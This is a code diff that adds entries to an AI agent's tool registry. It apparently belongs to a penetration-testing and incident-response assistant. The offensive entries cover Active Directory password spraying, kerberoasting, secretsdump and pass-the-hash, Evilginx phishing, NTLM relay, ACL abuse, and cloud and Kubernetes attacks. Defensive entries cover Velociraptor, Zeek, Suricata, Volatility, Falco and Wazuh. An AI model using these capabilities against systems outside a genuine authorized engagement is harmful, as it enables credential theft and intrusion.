+        art = str(args.get("artifact", "Generic.Client.Info")).strip()
+        cmd = VELO + '"$V" --nobanner artifacts collect ' + shlex.quote(art) + " 2>&1 | tail -160"
+    elif mode == "hunt":
+        vql = str(args.get("query", "")).strip()
+        if not vql:
+            return ("triage hunt: give a 'query' (VQL), e.g. "
+                    "\"SELECT Name,Pid,Exe FROM pslist()\" — or use mode=collect artifact=<name>.")
+        cmd = VELO + '"$V" --nobanner query ' + shlex.quote(vql) + " 2>&1 | tail -160"
+    else:
+        return "triage mode = collect | hunt | artifacts. Live IR with Velociraptor."
+    out, rc, where = _def_run(cmd, 900)
+    if "VELO_MISSING" in out:
+        return ("triage: Velociraptor not installed — grab the single binary from "
+                "velociraptor.app/downloads and put it on PATH as 'velociraptor'.")
+    return _def_report("triage(" + mode + ")", cmd, out or "(no output)", rc, where)
+
+
 BUILTIN_TOOLS: dict[str, dict] = {
     "shell": {
         "desc": (
@@ -2968,6 +3525,127 @@ BUILTIN_TOOLS: dict[str, dict] = {
                  "SCOPE.md. Run at the end or any time for a running picture."),
         "args": {},
         "func": tool_report,
+    },
+    "ad": {
+        "desc": ("Active Directory attack EXECUTION on an authorized domain (NetExec + "
+                 "Impacket + Certipy): mode=enum|spray|kerberoast|asrep|secretsdump|exec|"
+                 "certipy. The active sibling of ad_enum. Needs target (DC/host) + "
+                 "authorization; SCOPE-confined; spray is rate-limited."),
+        "args": {"target": "DC / host IP you are authorized to test", "authorization": "attestation",
+                 "mode": "enum|spray|kerberoast|asrep|secretsdump|exec|certipy",
+                 "domain": "AD domain (FQDN)", "user": "username", "password": "password",
+                 "hash": "NTLM hash (instead of password)", "users": "user-list path (spray/asrep)",
+                 "protocol": "spray proto: smb|ldap|winrm|mssql", "command": "exec: command to run"},
+        "func": tool_ad,
+    },
+    "aitm": {
+        "desc": ("Adversary-in-the-Middle phishing SIMULATION (Evilginx) for an authorized "
+                 "engagement: mode=phishlets|setup|lure|sessions|status. Targets people — "
+                 "REQUIRES 'phishing_authorization' (written SE/phishing scope) on top of the "
+                 "normal target scope. Sends nothing itself; captured secrets are redacted."),
+        "args": {"phishing_authorization": "written attestation that phishing/SE is in scope",
+                 "mode": "phishlets|setup|lure|sessions|status",
+                 "domain": "phishing domain you control/are authorized to use",
+                 "phishlet": "phishlet name (see mode=phishlets)"},
+        "func": tool_aitm,
+    },
+    "coerce": {
+        "desc": ("Auth coercion + NTLM relay for an authorized AD engagement (Coercer + "
+                 "Impacket ntlmrelayx): mode=coerce|relay. Needs target + authorization + listener."),
+        "args": {"target": "host to coerce/relay", "authorization": "attestation",
+                 "mode": "coerce|relay", "listener": "your relay/capture IP",
+                 "relay_to": "relay target (relay mode)", "domain": "AD domain",
+                 "user": "user", "password": "password"},
+        "func": tool_coerce,
+    },
+    "bloodyad": {
+        "desc": ("AD object/ACL abuse for an authorized engagement (bloodyAD): "
+                 "mode=whoami|get|dacl|addcomputer|shadow|setpassword. Needs target(DC) + "
+                 "authorization + domain/user/password."),
+        "args": {"target": "DC", "authorization": "attestation",
+                 "mode": "whoami|get|dacl|addcomputer|shadow|setpassword", "domain": "AD domain",
+                 "user": "user", "password": "password", "hash": "NTLM hash",
+                 "object": "target object", "trustee": "grantee (dacl)", "new_password": "setpassword"},
+        "func": tool_bloodyad,
+    },
+    "winrm": {
+        "desc": ("Interactive-style WinRM on an authorized Windows host (evil-winrm): "
+                 "mode=exec (one command) | connect (emit interactive string). PtH via hash. "
+                 "Needs target + authorization + user + password/hash."),
+        "args": {"target": "Windows host", "authorization": "attestation", "mode": "exec|connect",
+                 "user": "user", "password": "password", "hash": "NTLM hash", "command": "exec: command"},
+        "func": tool_winrm,
+    },
+    "cloudx": {
+        "desc": ("OFFENSIVE cloud for an authorized engagement (active sibling of cloud_audit): "
+                 "mode=aws(Pacu)|azure(ROADrecon)|azuread(AzureHound). Creds from env. Needs "
+                 "target(account/tenant) + authorization."),
+        "args": {"target": "account/tenant id", "authorization": "attestation",
+                 "mode": "aws|azure|azuread", "commands": "pacu modules (aws)"},
+        "func": tool_cloudx,
+    },
+    "kube": {
+        "desc": ("OFFENSIVE Kubernetes for an authorized engagement: mode=hunt(kube-hunter)|"
+                 "rbac(kubectl can-i)|enum(peirates). Needs target(API/cluster) + authorization."),
+        "args": {"target": "API server/cluster", "authorization": "attestation", "mode": "hunt|rbac|enum"},
+        "func": tool_kube,
+    },
+    "emulate": {
+        "desc": ("Adversary emulation / detection validation (Atomic Red Team): fire an ATT&CK "
+                 "technique on an authorized host, then check detect/triage/netmon caught it. "
+                 "mode=list|run|cleanup. EXECUTES attack behaviour — needs target + authorization."),
+        "args": {"target": "authorized host (e.g. localhost)", "authorization": "attestation",
+                 "mode": "list|run|cleanup", "technique": "ATT&CK id, e.g. T1059.004"},
+        "func": tool_emulate,
+    },
+    "netmon": {
+        "desc": ("DEFENSIVE network detection: Zeek (traffic->logs) + Suricata (signature IDS) "
+                 "over a PCAP or an interface you own. mode=pcap file= | live interface=. No gate."),
+        "args": {"mode": "pcap|live", "file": "pcap path (pcap)", "interface": "iface (live)",
+                 "seconds": "live capture seconds"},
+        "func": tool_netmon,
+    },
+    "memforensics": {
+        "desc": ("DEFENSIVE memory forensics (Volatility3) on a memory image you captured — "
+                 "catches fileless/in-memory implants. Give file= and optional plugin=. No gate."),
+        "args": {"file": "memory dump path", "plugin": "vol3 plugin (default windows.pslist)"},
+        "func": tool_memforensics,
+    },
+    "falco": {
+        "desc": ("DEFENSIVE runtime EDR (Falco/eBPF): live syscall detection of priv-esc, "
+                 "unexpected exec, container escape. mode=status|rules|run. No gate."),
+        "args": {"mode": "status|rules|run", "seconds": "run capture seconds"},
+        "func": tool_falco,
+    },
+    "wazuh": {
+        "desc": ("DEFENSIVE SIEM query (Wazuh API): mode=agents|alerts. Reads WAZUH_API_URL/"
+                 "USER/PASSWORD from env. No gate."),
+        "args": {"mode": "agents|alerts"},
+        "func": tool_wazuh,
+    },
+    "intel": {
+        "desc": ("Threat-intel / IOC enrichment: a hash/IP/domain -> verdict via VirusTotal + "
+                 "OTX + MISP (keys from env). Read-only lookup. No gate."),
+        "args": {"ioc": "hash, IP, or domain to enrich"},
+        "func": tool_intel,
+    },
+    "velociraptor": {
+        "desc": ("OFFENSIVE Velociraptor for an authorized engagement: post-exploitation "
+                 "collection + VQL execution on a foothold, and offline-collector generation. "
+                 "mode=query|collect|offline|hunt. The offensive sibling of `triage`. Needs "
+                 "target + authorization; SCOPE-confined; audited. VQL is powerful — in scope only."),
+        "args": {"target": "authorized host / foothold", "authorization": "attestation",
+                 "mode": "query|collect|offline|hunt", "query": "VQL (query/hunt)",
+                 "artifact": "artifact name (collect/offline)", "config": "server API config (hunt)"},
+        "func": tool_velociraptor,
+    },
+    "triage": {
+        "desc": ("DEFENSIVE live endpoint IR triage & hunting with Velociraptor on a host "
+                 "you own / are responding to: mode=collect (artifact collection), hunt (VQL "
+                 "query), artifacts (list). The blue mirror of the offensive suite."),
+        "args": {"mode": "collect|hunt|artifacts", "artifact": "artifact name (collect)",
+                 "query": "VQL (hunt)"},
+        "func": tool_triage,
     },
     "inventory": {
         "desc": ("Query the asset inventory (hosts + open ports/services) built "
